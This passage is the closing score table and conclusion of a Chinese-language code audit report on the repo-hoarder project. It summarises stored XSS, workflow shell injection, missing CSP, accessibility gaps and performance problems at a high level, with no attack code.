| 自动化程度 | 4.0 | 全链路自动化，但有注入和静默失败风险 |
| 文档质量 | 3.0 | 双语 README 完善，但与实际行为有漂移 |
| 测试覆盖 | 3.0 | 核心路径覆盖良好，缺少安全/性能/E2E |
| **综合** | **3.3** | **功能驱动型项目，安全与可访问性是主要短板** |

### 结论

repo-hoarder 是一个功能丰富度极高的个人项目——零框架实现了虚拟滚动、PWA、i18n、灵感模式、对比、推荐等通常依赖框架的特性，自动化管线基本跑通，数据合并策略成熟。

本次深度审计揭示了三个主要短板维度：

1. **安全性**（最紧迫）：6 处存储型 XSS + 1 处工作流 shell 注入 + 无 CSP 缓解层。虽然攻击面受限于 `repos.json` 数据投毒（需要 PR 合并权限），但一旦触发影响所有访问者。
2. **可访问性**（最广泛）：颜色对比度、键盘导航、触摸目标、焦点管理、屏幕阅读器支持均有系统性缺陷。灵感模式的 ARIA 实现是亮点，但基础交互层（卡片、模态框、筛选器）缺陷密集。
3. **性能**（最易修复）：O(n²) 渲染、debounce 策略错误、解析阻塞——多数是 5-15 分钟的一行修复。

修复紧急安全问题（XSS + 注入 + CSP）后，项目即可安全运行。中期治理可访问性和性能将显著提升专业度。长期来看，数据分片和模块化拆分将支撑项目的可持续增长。

---

*报告生成于 2026-07-19，基于 commit 68f7ec9 的代码状态。*
*深度审计覆盖：安全（XSS/注入/CSP/SRI）、性能（渲染/内存/加载）、可访问性（WCAG 2.1 AA）、数据质量（一致性/边界/容错）。*
